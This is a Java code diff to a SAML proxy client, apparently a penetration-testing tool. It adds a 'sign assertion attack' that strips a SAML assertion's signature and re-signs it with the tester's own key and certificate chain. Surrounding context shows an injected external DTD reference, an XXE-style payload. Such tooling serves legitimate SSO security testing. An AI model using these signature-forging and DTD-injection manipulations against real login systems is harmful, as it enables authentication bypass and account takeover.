@@ -178,6 +178,11 @@ public class SamlHTTPClient implements HTTPClient {
                     samlProxyHeader += "removed assertion signature;";
                 }
 
+                if (this.samlProxyConfig.doSignAssertionAttack()) {
+                    String newSamlResponse = signAssertionMessage(namedValues[idx].getValue());
+                    namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
+                    samlProxyHeader += "sign assertion;";
+                }
                 if (this.samlProxyConfig.doSignSamlMessage()) {
                     String newSamlResponse = signSamlMessage(namedValues[idx].getValue());
                     namedValues[idx] = new NamedValue(namedValues[idx].getName(), newSamlResponse);
@@ -474,6 +479,37 @@ public class SamlHTTPClient implements HTTPClient {
         String newDecodedSamlResponse = "<!DOCTYPE SomeElement SYSTEM \"" + dtdUri + "\">" + new String(decodedSamlResponse);
         String newSamlResponse = Encoding.urlEncode(Base64.encode(newDecodedSamlResponse.getBytes()));
         return newSamlResponse;
+    }
+
+    private String signAssertionMessage(String samlResponse) throws IOException, TransformerConfigurationException, ParserConfigurationException, SAXException, Base64DecodingException, TransformerException, XMLSecurityException {
+        Document document = parseDocument(samlResponse);
+        Element assertionSignatureElement = SamlModel.findAssertionSignatureElement(document);
+        if (null == assertionSignatureElement) {
+            return samlResponse;
+        }
+        Node beforeNode = assertionSignatureElement.getNextSibling();
+        Node parentNode = assertionSignatureElement.getParentNode();
+        parentNode.removeChild(assertionSignatureElement);
+        XMLSignature xmlSignature = new XMLSignature(document, null, XMLSignature.ALGO_ID_SIGNATURE_RSA_SHA1);
+        parentNode.insertBefore(xmlSignature.getElement(), beforeNode);
+        
+        
+        
+        KeyStore.PrivateKeyEntry privateKeyEntry = this.samlProxyConfig.getPrivateKeyEntry();
+
+        KeyInfo keyInfo = xmlSignature.getKeyInfo();
+        X509Data x509Data = new X509Data(document);
+        Certificate[] certificateChain = privateKeyEntry.getCertificateChain();
+        for (int certIdx = 0; certIdx < certificateChain.length; certIdx++) {
+            Certificate certificate = certificateChain[certIdx];
+            x509Data.addCertificate((X509Certificate) certificate);
+        }
+        keyInfo.add(x509Data);
+
+        PrivateKey privateKey = privateKeyEntry.getPrivateKey();
+        xmlSignature.sign(privateKey);
+        
+        return outputDocument(document);
     }
 
     private String signSamlMessage(String samlResponse) throws IOException, ParserConfigurationException, SAXException, Base64DecodingException, TransformerConfigurationException, TransformerException, XMLSecurityException {
